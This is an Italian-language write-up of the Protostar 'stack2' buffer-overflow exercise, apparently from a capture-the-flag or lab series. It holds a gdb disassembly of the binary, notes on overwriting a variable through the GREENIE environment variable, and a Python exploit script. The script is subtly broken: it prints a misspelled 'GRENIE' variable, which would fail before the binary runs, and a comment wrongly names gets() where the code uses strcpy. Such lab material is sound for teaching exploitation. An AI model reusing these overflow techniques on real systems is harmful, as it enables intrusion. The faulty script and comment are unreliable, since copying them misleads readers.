````
proto@b92cf65f7998:/opt/protostar/bin$ gdb -q                                                      
(gdb) file stack2
Reading symbols from stack2...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048494 <+0>:	push   %ebp
   0x08048495 <+1>:	mov    %esp,%ebp
   0x08048497 <+3>:	and    $0xfffffff0,%esp
   0x0804849a <+6>:	sub    $0x60,%esp
   0x0804849d <+9>:	movl   $0x80485e0,(%esp)
   0x080484a4 <+16>:	call   0x804837c <getenv@plt>
   0x080484a9 <+21>:	mov    %eax,0x5c(%esp)
   0x080484ad <+25>:	cmpl   $0x0,0x5c(%esp)
   0x080484b2 <+30>:	jne    0x80484c8 <main+52>
   0x080484b4 <+32>:	movl   $0x80485e8,0x4(%esp)
   0x080484bc <+40>:	movl   $0x1,(%esp)
   0x080484c3 <+47>:	call   0x80483bc <errx@plt>
   0x080484c8 <+52>:	movl   $0x0,0x58(%esp)
   0x080484d0 <+60>:	mov    0x5c(%esp),%eax
   0x080484d4 <+64>:	mov    %eax,0x4(%esp)
   0x080484d8 <+68>:	lea    0x18(%esp),%eax
   0x080484dc <+72>:	mov    %eax,(%esp)
   0x080484df <+75>:	call   0x804839c <strcpy@plt>
   0x080484e4 <+80>:	mov    0x58(%esp),%eax
   0x080484e8 <+84>:	cmp    $0xd0a0d0a,%eax
   0x080484ed <+89>:	jne    0x80484fd <main+105>
   0x080484ef <+91>:	movl   $0x8048618,(%esp)
   0x080484f6 <+98>:	call   0x80483cc <puts@plt>
   0x080484fb <+103>:	jmp    0x8048512 <main+126>
   0x080484fd <+105>:	mov    0x58(%esp),%edx
   0x08048501 <+109>:	mov    $0x8048641,%eax
   0x08048506 <+114>:	mov    %edx,0x4(%esp)
   0x0804850a <+118>:	mov    %eax,(%esp)
   0x0804850d <+121>:	call   0x80483ac <printf@plt>
   0x08048512 <+126>:	leave  
   0x08048513 <+127>:	ret    
End of assembler dump.
````
Come in #stack1 abbiamo una compare
0x080484e8 <+84>:	cmp    $0xd0a0d0a,%eax
qua l'idea è di cambiare la variabile di ambiente per permettere che dentro ad essa ci sia il nostro payload di attacco.
La difficoltà è che 0xd0a0d0a rappresenta dei caratteri non stampabili, quindi c'è da trovare una soluzione differente.
L'idea è quella in primis con uno script python di settare la variabile di ambiente a nostro piacimento.
Questo è stato il mio riferimento
https://stackoverflow.com/questions/44479826/how-do-you-set-a-string-of-bytes-from-an-environment-variable-in-python
scrivere i byte diretti nella variabile di ambiente per poi passare i byte per pownare la macchina.

```` bash
(gdb) b *0x080484a4              # breakpoint ad una istruzione
(gdb) display /4wx *(int*)$esp   # guarda cosa punta esp
````
**exploit.py**
```` python
import os

junk = '\x41'                 # Junk to overflow the buffer (gets())
cmp = '\x0a\x0d\x0a\x0d'      # Value to pass the cmp instruction

# Prepare the env variable
os.environ["GREENIE"] = junk * 64 + cmp
print(os.environ["GRENIE"])

# Execute the binary inside this env
os.system("./stack2")
````
